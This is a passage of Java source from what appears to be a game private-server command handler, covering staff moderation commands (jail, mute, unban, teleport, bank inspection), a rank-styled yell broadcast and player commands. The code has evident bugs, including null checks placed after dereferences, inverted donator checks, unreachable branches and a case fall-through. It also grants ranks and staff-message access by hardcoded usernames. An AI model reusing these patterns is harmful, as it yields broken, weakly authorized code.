				return true;

			case "staffyell":
				String message = "";
				for (int i = 1; i < cmd.length; i++)
					message += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				sendYell(player, Utils.fixChatMessage(message), true);
				return true;


			case "hide":
				if (player.getControlerManager().getControler() != null) {
					player.getPackets().sendGameMessage("You cannot hide in a public event!");
					return true;
				}
				player.getAppearence().switchHidden();
				player.getPackets().sendGameMessage("Hidden? " + player.getAppearence().isHidden());
				return true;

			case "unjail":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setJailed(0);
					target.getControlerManager()
					.startControler("JailControler");
					target.getPackets().sendGameMessage(
							"You've been unjailed by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have unjailed: "+target.getDisplayName()+".");
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setJailed(0);
					player.getPackets().sendGameMessage(
							"You have unjailed: "+Utils.formatPlayerNameForDisplay(name)+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;

			case "teleto":
				if (player.isLocked() || player.getControlerManager().getControler() != null) {
					player.getPackets().sendGameMessage("You cannot tele anywhere from here.");
					return true;
				}
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (Wilderness.isAtWild(player) || Wilderness.isAtWild(target) || player.isInDung() || target.isInDung()) {
					player.sm("Nice try");
					return true;
				}
				if(target == null)
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				else
					player.setNextWorldTile(target);
				return true;
			case "teletome":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (Wilderness.isAtWild(player) || Wilderness.isAtWild(target) || player.isInDung() || target.isInDung()) {
					player.sm("Nice try");
					return true;
				}
				if(target == null)
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				else {
					if (target.isLocked() || target.getControlerManager().getControler() != null) {
						player.getPackets().sendGameMessage("You cannot teleport this player.");
						return true;
					}
					if (target.getRights() > 1) {
						player.getPackets().sendGameMessage(
								"Unable to teleport a developer to you.");
						return true;
					}
					target.setNextWorldTile(player);
				}
				return true;
				
			case "swapbook":
				
				player.getDialogueManager().startDialogue("SwapSpellBook");
				
				return true;
				
				
			case "unnull":
				
				
			case "sendhome":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (player.isInDung() || target.isInDung()) {
					return true;
				}
				if(target == null)
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				else {
					target.unlock();
					target.getControlerManager().forceStop();
					if(target.getNextWorldTile() == null) { //if controler wont tele the player
						int i;
						if (player.isPker)
							i = 1;
						else
							i = 0;
						target.setNextWorldTile(Settings.RESPAWN_PLAYER_LOCATION[i]);
					}
					player.getPackets().sendGameMessage("You have unnulled: "+target.getDisplayName()+".");
					return true; 
				}
				return true;
			}
		}
		return false;
	}

    public static boolean processSupportCommands(Player player, String[] cmd,
			boolean console, boolean clientCommand) {
		String name;
		Player target;
		if (clientCommand) {
	
		} else {
			switch (cmd[0]) {
			
			 case "checkbank": {
					if (!player.hasStaffPin) {
			   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
						player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
					} else {
					if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
					player.getPackets().sendGameMessage("You can't open your bank during this game.");
					return true;
					}
					if(player.isLocked() || player.getControlerManager().getControler() instanceof PestInvasion){
					player.getPackets().sendGameMessage("You can't open your bank during this game.");
					return true;
					}
	                name = "";
	                for (int i = 1; i < cmd.length; i++) {
	                    name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
	                }
	                Player Other = World.getPlayerByDisplayName(name);
	                try {
	                    player.getPackets().sendItems(95, Other.getBank().getContainerCopy());
	                    player.getBank().openPlayerBank(Other);
	                } catch (Exception e) {
	                }
	            }
	            }
	            return true;
				case "hide":
					if (player.getControlerManager().getControler() != null) {
						player.getPackets().sendGameMessage("You cannot hide in a public event!");
						return true;
					}
					player.getAppearence().switchHidden();
					player.getPackets().sendGameMessage("Hidden? " + player.getAppearence().isHidden());
					return true;
			 case "teleto":
					if (player.isLocked() || player.getControlerManager().getControler() != null) {
						player.getPackets().sendGameMessage("You cannot tele anywhere from here.");
						return true;
					}
					name = "";
					for (int i = 1; i < cmd.length; i++)
						name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
					target = World.getPlayerByDisplayName(name);
					if (Wilderness.isAtWild(player) || Wilderness.isAtWild(target) || player.isInDung() || target.isInDung()) {
						player.sm("Nice try");
						return true;
					}
					if(target == null)
						player.getPackets().sendGameMessage(
								"Couldn't find player " + name + ".");
					else
						player.setNextWorldTile(target);
					return true;
			case "unjail":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setJailed(0);
					target.getControlerManager()
					.startControler("JailControler");
					target.getPackets().sendGameMessage(
							"You've been unjailed by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have unjailed: "+target.getDisplayName()+".");
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setJailed(0);
					player.getPackets().sendGameMessage(
							"You have unjailed: "+Utils.formatPlayerNameForDisplay(name)+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;
			case "unmute":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (target != null) {
					target.setMuted(0);
					target.getPackets().sendGameMessage(
							"You've been unmuted by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have unmuted: "+target.getDisplayName()+".");
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setMuted(0);
					player.getPackets().sendGameMessage(
							"You have unmuted: "+Utils.formatPlayerNameForDisplay(name)+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;
		/*	case "permban":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				Player.bans(player, name);
				if (target != null) {
					if (target.getRights() == 2)
						return true;
					target.setPermBanned(true);
					target.getPackets().sendGameMessage(
							"You've been perm banned by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have perm banned: "+target.getDisplayName()+".");
					target.getSession().getChannel().close();
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc11 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc11);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					if (target.getRights() == 2)
						return true;
					target.setPermBanned(true);
					player.getPackets().sendGameMessage(
							"You have perm banned: "+Utils.formatPlayerNameForDisplay(name)+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc11);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				}
				return true; */
			case "jail":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				Player.jails(player, name);
				if (player.isInDung() || target.isInDung()) {
					return true;
				}
				if (target != null) {
					target.setJailed(Utils.currentTimeMillis()
							+ (24 * 60 * 60 * 1000));
					target.getControlerManager()
					.startControler("JailControler");
					target.getPackets().sendGameMessage(
							"You've been Jailed for 24 hours by "+Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have Jailed 24 hours: "+target.getDisplayName()+".");
					SerializableFilesManager.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"+name.replace(" ", "_")+".p");
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setJailed(Utils.currentTimeMillis()
							+ (24 * 60 * 60 * 1000));
					player.getPackets().sendGameMessage(
							"You have muted 24 hours: "+Utils.formatPlayerNameForDisplay(name)+".");
					try {
						SerializableFilesManager.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;
			case "szone":
				if (player.isLocked() || player.getControlerManager().getControler() != null) {
					player.getPackets().sendGameMessage("You cannot tele anywhere from here.");
					return true;
				}
				player.setNextWorldTile(new WorldTile(2667, 10396, 0));
				return true;
				
			case "skipmini":
				player.setNextWorldTile(new WorldTile(2341, 3171, 0));
				player.getPackets().sendGameMessage("You skip the underground pass Minigame.");
				return true;
				
			case "newboss":
				if (player.isLocked() || player.getControlerManager().getControler() != null) {
					player.getPackets().sendGameMessage("You cannot tele anywhere from here.");
					return true;
				}
				player.setNextWorldTile(new WorldTile(2521, 5232, 0));
				return true;
			case "forcekick":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if (target == null) {
					player.getPackets().sendGameMessage(
							Utils.formatPlayerNameForDisplay(name)+" is not logged in.");
					return true;
				}
				target.forceLogout();
				player.getPackets().sendGameMessage("You have kicked: "+target.getDisplayName()+".");
				return true;
			case "unpermban":
				if (!player.hasStaffPin) {
		   			player.getTemporaryAttributtes().put("banning_security", Boolean.TRUE);
					player.getPackets().sendRunScript(108, new Object[] { "Please enter your security pin"});
				} else {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				File acc = new File("data/characters/"+name.replace(" ", "_")+".p");
				target = null;
				if (target == null) {
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
				}
				target.setPermBanned(false);
				target.setBanned(0);
				player.getPackets().sendGameMessage(
						"You've unbanned "+Utils.formatPlayerNameForDisplay(target.getUsername())+ ".");
				try {
					SerializableFilesManager.storeSerializableClass(target, acc);
				} catch (IOException e) {
					e.printStackTrace();
				}
				}
				return true; 
				
			case "unipban":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				File acc11 = new File("data/characters/"+name.replace(" ", "_")+".p");
				target = null;
				if (target == null) {
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc11);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
				}
				IPBanL.unban(target);
				player.getPackets().sendGameMessage(
						"You've unipbanned "+Utils.formatPlayerNameForDisplay(target.getUsername())+ ".");
				try {
					SerializableFilesManager.storeSerializableClass(target, acc11);
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true; 
	
			case "unnull":
			case "sendhome":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if(target == null)
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				else {
					target.unlock();
					target.getControlerManager().forceStop();
					if(target.getNextWorldTile() == null) {//if controler wont tele the player
						int i;
						if (player.isPker)
							i = 1;
						else
							i = 0;
						target.setNextWorldTile(Settings.RESPAWN_PLAYER_LOCATION[i]);
					}
					player.getPackets().sendGameMessage("You have unnulled: "+target.getDisplayName()+".");
					return true; 
				}
				return true;
	
			case "staffyell":
				String message = "";
				for (int i = 1; i < cmd.length; i++)
					message += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				sendYell(player, Utils.fixChatMessage(message), true);
				return true;
	
			case "ticket":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't use ticket while in Dungeoneering.");
				return true;
				} else {
				player.setNextWorldTile((new WorldTile(2667, 10396, 0)));
				TicketSystem.answerTicket(player);
				return true;
				}
	
			case "finishticket":
				TicketSystem.removeTicket(player);
				return true;
				
			case "unipbanplayer":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				File acc = new File("data/characters/"+name.replace(" ", "_")+".p");
				target = null;
				if (target == null) {
					try {
						target = (Player) SerializableFilesManager.loadSerializedFile(acc);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
				}
				IPBanL.unban(target);
				player.getPackets().sendGameMessage(
						"You've unipbanned "+Utils.formatPlayerNameForDisplay(target.getUsername())+ ".");
				try {
					SerializableFilesManager.storeSerializableClass(target, acc);
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true; 
	
			case "staffmeeting":
				for (Player staff : World.getPlayers()) {
					if (staff.getRights() == 0)
						continue;
					staff.setNextWorldTile(new WorldTile(2675, 10418, 0));
					staff.getPackets().sendGameMessage("You been teleported for a staff meeting by "+player.getDisplayName());
				}
				return true;
	
			case "mute":
				name = "";

				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				Player.mutes(player, name);
				if (target != null) {
					target.setMuted(Utils.currentTimeMillis()
							+ (player.getRights() >= 1 ? (48 * 60 * 60 * 1000) : (1 * 60 * 60 * 1000)));
					target.getPackets().sendGameMessage(
							"You've been muted for " + (player.getRights() >= 1 ? " 48 hours by " : "2 days by ") +Utils.formatPlayerNameForDisplay(player.getUsername())+".");
					player.getPackets().sendGameMessage(
							"You have muted " + (player.getRights() >= 1 ? " 48 hours by " : "2 days by by ") + target.getDisplayName()+".");
				} else {
					name = Utils.formatPlayerNameForProtocol(name);
					if(!SerializableFilesManager.containsPlayer(name)) {
						player.getPackets().sendGameMessage(
								"Account name "+Utils.formatPlayerNameForDisplay(name)+" doesn't exist.");
						return true;
					}
					target = SerializableFilesManager.loadPlayer(name);
					target.setUsername(name);
					target.setMuted(Utils.currentTimeMillis()
							+ (player.getRights() >= 1 ? (48 * 60 * 60 * 1000) : (1 * 60 * 60 * 1000)));
					player.getPackets().sendGameMessage(
							"You have muted " + (player.getRights() >= 1 ? " 48 hours by " : "1 hour by ") + target.getDisplayName()+".");
					SerializableFilesManager.savePlayer(target);
				}
				return true;
			}
		}
		return false;
	}

	public static void sendYell(Player player, String message,
            boolean isStaffYell) {
		//message = Censor.getFilteredMessage(message);
        if (player.getMuted() > Utils.currentTimeMillis()) {
            player.getPackets().sendGameMessage("You temporary muted. Recheck in 28 hours and post on forums on Appeal.");
            return;
        }
        if (player.getRights() < 2) {
            String[] invalid = {"<euro", "<img", "<img=", "<col", "<col=",
                "<shad", "<shad=", "<str>", "<u>"};
            for (String s : invalid) {
                if (message.contains(s)) {
                    player.getPackets().sendGameMessage("You cannot add additional code to the message.");
                    return;
                }
            }
        }
        for (Player players : World.getPlayers()) {
            if (players == null || !players.isRunning()) {
                continue;
            }
            if (isStaffYell) {
                if (players.getRights() > 2
                        || players.getUsername().equalsIgnoreCase("Azura")) {
                    players.getPackets().sendGameMessage("<col=FFFFFF>[Admin] <img=0><col=FFFFFF>" + Utils.formatPlayerNameForDisplay(player.getUsername()) + ": " + message + ".", true);
                }
                return;
            }
			
			/**
			* || player.getUsername().equalsIgnoreCase("")
			*/

            /**
             * Lead Developer
             */
            
            /**
             * Lead Developer
             */
            
            if (player.getUsername().equalsIgnoreCase("99max99")) {
                players.getPackets().sendGameMessage(
                        "<col=00E633><shad=000000>[Main Owner]<img=10><col=00E633>"
                        + player.getDisplayName() + ": </col><col=00E633><shad=000000>"
                        + message + "</col>");
            }
            
            if (player.getUsername().equalsIgnoreCase("") || player.getUsername().equalsIgnoreCase("")) {
            	players.getPackets().sendGameMessage(
                        "<col=ffffff><shad=000000>[Developer]<img=10><col=000000>"
                        + player.getDisplayName() + ": </col><col=ff0000><shad=000000>"
                        + message + "</col>");
            }
        
            /**
             * Lead Developer
             */
            if (player.getUsername().equalsIgnoreCase("reddragon")) {
                players.getPackets().sendGameMessage(
                        "<col=0099CC><shad=000000>[Co-Owner]<img=10><col=0099CC>"
                        + player.getDisplayName() + ": </col><col=0099CC><shad=000000>"
                        + message + "</col>");
            }
            if (player.getUsername().equalsIgnoreCase("Nick")) {
                players.getPackets().sendGameMessage(
                        "<col=00FFFB><shad=c0c0c0>[Developer] </shad></col><img=1><col=00FFFB>"
                        + player.getDisplayName() + ": </col><col=00FFFB><shad=c0c0c0>"
                        + message + "</col>");
            }
            /**
             * Master Hardcore
             */
            if (player.getUsername().equalsIgnoreCase("mnosz")) {
                players.getPackets().sendGameMessage(
                        "<col=000000><shad=000000>[Player]<col=FF0000>"
                        + player.getDisplayName() + ": </col><col=00CCFF><shad=000000>"
                        + message + "</col>");
            }
            
            
            

            if (player.getUsername().equalsIgnoreCase("")) {
                players.getPackets().sendGameMessage(
                        "<col=8A2BE2><shad=000000>[Head-Moderator]<col=8A2BE2>"
                        + player.getDisplayName() + ": "
                        + message + "</col><shad>");
            }
            
            /**
             * end 
             */


            if (player.getUsername().equalsIgnoreCase("")) {
                players.getPackets().sendGameMessage(
                        "<col=000000><shad=00ffff>[Server Helper]<col=0000ff><shad=00ffff>"
                        + player.getDisplayName() + ": </col=FF0000><shad=000000>"
                        + message + "</col>");
                
           
            }

            if (player.getUsername().equalsIgnoreCase("")) {
                players.getPackets().sendGameMessage(
                        "<col=0000ff><shad=00ffff>[Moderator]<col=0000ff><col=0000ff><shad=00ffff>"
                        + player.getDisplayName() + ": </col><col=0000ff><shad=00ffff>"
                        + message + "</col>");
           // } else if (player.isAnthonyRank == true) {
                //players.getPackets().sendGameMessage(
                      //  "<col=B88A00>[Anthony Rank]</col><FF6600>"
                     //   + player.getDisplayName() + ": </col><col=FFFFCC>"
                      //  + message + "</col>");
            } else if (player.getRights() == 0 && !player.getUsername().equalsIgnoreCase("mnosz") && (player.isAnthonyRank == false) && !player.isDonator() && !player.isExtremeDonator() && !player.isLegendaryDonator() && !player.isSupremeDonator() && !player.isDivineDonator() && !player.isAngelicDonator() && !player.isSupporter()) {
                players.getPackets().sendGameMessage(
                        "<col=ff0033>[Player] <col=ff0033>"
                        + player.getDisplayName() + ": </col><col=ff0033>"
                        + message + "</col>");
            } else if (player.getRights() == 1) {
                players.getPackets().sendGameMessage(
                        "<col=C0C0C0><shad=000000>[Moderator]<img=0><col=FFFFFF><shad=000000>"
                        + player.getDisplayName() + ": </col><col=C0C0C0><shad=000000>"
                        + message + "</col>");
            } else if (player.isAngelicDonator() && !(player.getRights() == 1) && !(player.getRights() == 2) && !(player.isSupporter())) {
                players.getPackets().sendGameMessage(
                        "<col=ffffff>[Angelic]<img=15><col=ffffff>"
                        + player.getDisplayName() + ": </col><col=357EC7>"
                        + message + "</col>");
            } else if (player.isDivineDonator() && !(player.getRights() == 1) && !(player.getRights() == 2) && !(player.isSupporter())) {
                players.getPackets().sendGameMessage(
                        "<col=ffffff>[Divine]<img=16><col=6C21ED>"
                        + player.getDisplayName() + ": </col><col=357EC7>"
                        + message + "</col>");
            } else if (player.isSupremeDonator() && !(player.getRights() == 1) && !(player.getRights() == 2) && !(player.isSupporter())) {
                players.getPackets().sendGameMessage(
                        "<col=ffa34c>[Supreme]<img=13><col=ffa34c>"
                        + player.getDisplayName() + ": </col><col=357EC7>"
                        + message + "</col>");
            } else if (player.isLegendaryDonator() && !(player.getRights() == 1) && !(player.getRights() == 2) && !(player.isSupporter())) {
                players.getPackets().sendGameMessage(
                        "<col=0000ff><shad=00ffff>[Legendary]<img=12><col=0000ff><shad=00ffff>"
                        + player.getDisplayName() + ": </col><col=357EC7><shad=00ffff>"
                        + message + "</col>");
            } else if (player.isExtremeDonator() && !(player.getRights() == 1) && !(player.getRights() == 2) && !(player.isSupporter())) {
                players.getPackets().sendGameMessage(
                        "<col=006600><shad=000000>[Extreme]<img=8><col=006600><shad=000000>"
                        + player.getDisplayName() + ": </col><col=357EC7><shad=000000>"
                        + message + "</col>");
            } else if (player.isDonator() && !(player.getRights() == 1) && !(player.getRights() == 2) && !(player.isSupporter())) {
                players.getPackets().sendGameMessage(
                        "<col=a50b00>[Donator]<img=11><col=a50b00>"
                        + player.getDisplayName() + ": </col><col=357EC7>"
                        + message + "</col>");
            } else if (player.getRights() == 2 && !player.getUsername().equalsIgnoreCase("99max99") && !player.getUsername().equalsIgnoreCase("reddragon") && !player.getUsername().equalsIgnoreCase("") && !player.getUsername().equalsIgnoreCase("")) {
                players.getPackets().sendGameMessage(
                        "<col=ffff00><shad=000000>[Administrator]<img=1><col=ffff00><shad=000000>"
                        + player.getDisplayName() + ": </col><col=ffff00>"
                        + message + "</col>");
            } else if (player.isSupporter()) {
                players.getPackets().sendGameMessage(
                        "<col=3299CC><shad=3333FF>[Support-Team]<img=14> <col=3299CC><shad=3333FF>"
                        + player.getDisplayName() + ": </col><col=3299CC><shad=3333FF>"
                        + message + "</col>");
            }
            }
        }

	public static boolean processNormalCommand(Player player, String[] cmd,
			boolean console, boolean clientCommand) {
		if (clientCommand) {

		} else {
			String message;
			String message1;
			Player target;
			String pass;
			switch (cmd[0]) {
			case "setyellcolor":
			case "changeyellcolor":
			case "yellcolor":
				if(!player.isExtremeDonator() || !player.isLegendaryDonator()) {
					player.getDialogueManager().startDialogue("SimpleMessage", "You've to be a extreme donator to use this feature.");
					return true;
				}
				player.getPackets().sendRunScript(109, new Object[] { "Please enter the yell color in HEX format." });
				player.getTemporaryAttributtes().put("yellcolor", Boolean.TRUE);
				return true;
			case "switchspawnmode":
				if(player.getRights() < 2)
					return true;
				player.setSpawnsMode(!player.isSpawnsMode());
				player.getPackets().sendGameMessage(
						"Spawns mode: " + player.isSpawnsMode());
				return true; 

			case "dz":
			case "donatorzone":
				if (player.isDonator()) {
					DonatorZone.enterDonatorzone(player);
				}
				return true;
				
			case "swimming":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("No.");
				return true;
				} else if(player.isInDung()) {
					player.getPackets().sendGameMessage("No.");
				return true;
			} else if (player.isDonator()) {
				player.getAppearence().setRenderEmote(846);
				player.setNextWorldTile(new WorldTile(3794, 5908, 0));
				player.sm("Have fun swimming!");
				
				return true;
			}

			case "resettrollname":
				player.getPetManager().setTrollBabyName(null);
				return true;
			case "settrollname":
				if (!player.isExtremeDonator() || !player.isLegendaryDonator()) {
					player.getPackets().sendGameMessage("This is an extreme donator only feature!");
					return true;
				}
				String name = "";
				for (int i = 1; i < cmd.length; i++) {
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				}
				name = Utils.formatPlayerNameForDisplay(name);
				if (name.length() < 3 || name.length() > 22) {
					player.getPackets().sendGameMessage("You can't use a name shorter than 3 or longer than 22 characters.");

					return true;
				}
				player.getPetManager().setTrollBabyName(name);
				if (player.getPet() != null && player.getPet().getId() == Pets.TROLL_BABY.getBabyNpcId()) {
					player.getPet().setName(name);
					player.getPackets().sendGameMessage("Your troll's name is now " + name + " ");
				}
				return true;

			case "recanswer":
				if (player.getRecovQuestion() == null) {
					player.getPackets().sendGameMessage(
							"Please set your recovery question first.");
					return true;
				}
				if (player.getRecovAnswer() != null && player.getRights() < 2) {
					player.getPackets().sendGameMessage(
							"You can only set recovery answer once.");
					return true;
				}
				message = "";
				for (int i = 1; i < cmd.length; i++)
					message += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				player.setRecovAnswer(message);
				player.getPackets()
				.sendGameMessage(
						"Your recovery answer has been set to - "
								+ Utils.fixChatMessage(player
										.getRecovAnswer()));
				return true; 
			case "highscores":
				Highscores.updateHighscores(player);
				return true;
			case "recquestion":
				if (player.getRecovQuestion() != null && player.getRights() < 2) {
					player.getPackets().sendGameMessage(
							"You already have a recovery question set.");
					return true;
				}
				message = "";
				for (int i = 1; i < cmd.length; i++)
					message += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				player.setRecovQuestion(message);
				player.getPackets().sendGameMessage(
						"Your recovery question has been set to - "
								+ Utils.fixChatMessage(player
										.getRecovQuestion()));
				return true; 

			case "empty":
				player.getInventory().reset();
				return true; 
			case "ticket":
				if (player.getMuted() > Utils.currentTimeMillis()) {
					player.getPackets().sendGameMessage(
							"You temporary muted. Recheck in 48 hours.");
					return true;
				}
				TicketSystem.requestTicket(player);
				return true; 
			case "ranks":
				PkRank.showRanks(player);
				return true; 
			case "vengrunes":
				if (player.isPker) {
					player.getInventory().addItem(9075, 50000);
					player.getInventory().addItem(560, 50000);
					player.getInventory().addItem(557, 50000);
				}
					return true;
			case "barragerunes":
				if (player.isPker) {
					player.getInventory().addItem(565, 250000);
					player.getInventory().addItem(555, 250000);
					player.getInventory().addItem(560, 250000);
				}
					return true;
			case "spawn":
				if (player.getControlerManager().getControler() instanceof Wilderness) {
					player.sm("You cannot spawn in the wilderness.");
					return false;
				}
				if (player.isPker) {
				if (cmd.length < 2) {
					player.getPackets().sendGameMessage(
							"Use: ::item id (optional:amount)");
					return true;
				}
				try {
					int itemId = Integer.valueOf(cmd[1]);
					if (cantSpawn(itemId)) {
						player.sm("You cannot spawn this item.");
						return true;
					}
					player.getInventory().addItem(itemId,
							cmd.length >= 3 ? Integer.valueOf(cmd[2]) : 1);
					player.stopAll();
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage(
							"Use: ::item id (optional:amount)");
				}
				} else {
					player.sm("Only pkers can use the spawn command.");
				}
				return true;
			case "capes":
				if (player.isPker) {
					if (player.highestKillstreak >= 10) {
						player.getInventory().addItem(20754, 1);
					}
					else if (player.highestKillstreak >= 20) {
						player.getInventory().addItem(20755, 1);
					}
					else if (player.highestKillstreak >= 30) {
						player.getInventory().addItem(20756, 1);
					}
					else if (player.highestKillstreak >= 40) {
						player.getInventory().addItem(20757, 1);
					}
					else if (player.highestKillstreak >= 50) {
						player.getInventory().addItem(20758, 1);
					}
					else if (player.highestKillstreak >= 60) {
						player.getInventory().addItem(20759, 1);
					}
					else if (player.highestKillstreak >= 70) {
						player.getInventory().addItem(20760, 1);
					}
					else if (player.highestKillstreak >= 80) {
						player.getInventory().addItem(20761, 1);
					}
					else if (player.highestKillstreak >= 90) {
						player.getInventory().addItem(20762, 1);
					}
					else
						player.sm("You need a killstreak of atleast 10 to gain a cape.");
				}
				return true;
			case "score":
			case "kdr":
				double kill = player.getKillCount();
				double death = player.getDeathCount();
				double dr = kill / death;
				player.setNextForceTalk(new ForceTalk(
						"<col=ff0000>I'VE KILLED " + player.getKillCount()
						+ " PLAYERS AND BEEN SLAYED "
						+ player.getDeathCount() + " TIMES. "));
				return true; 
			case "mymode":
				if (player.getGameMode() == 0){
					player.setNextForceTalk(new ForceTalk("I'm playing on game mode: Regular"));
				} else if (player.getGameMode() == 1){
					player.setNextForceTalk(new ForceTalk("I'm playing on game mode: Challenging"));
				} else if (player.getGameMode() == 2){
					player.setNextForceTalk(new ForceTalk("I'm playing on game mode: Difficult"));
				} else if (player.getGameMode() == 3){
					player.setNextForceTalk(new ForceTalk("I'm playing on game mode: Hardcore"));
				}
				return true; 

				
			case "returncape": //fixed this so don't touch it jordan!
				if (player.isMaxed == 1) {
					if (player.getInventory().containsItem(995, 5000000)) {
						player.getInventory().removeItemMoneyPouch(995, 5000000);
						player.getInventory().refresh();
						player.getBank().addItem(20767, 1, true);
						player.getBank().addItem(20768, 1, true);
						player.sm("<col=008000>Your cape is returned in your bank.");
				} else {
					player.sm("You need 5,000,000 coins to return your cape.");
				}
			  }
				return true;

			case "help":
				player.getInventory().addItem(1856, 1);
				player.getPackets().sendGameMessage(
						"You receive a guide book about "
								+ Settings.SERVER_NAME + ".");
				return true;
				
			case "drag":
				player.DS = 5;
				return true; 

			case "title":
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage("You must be a Donator to use this command.");
					return true;
				}
				if (cmd.length < 2) {
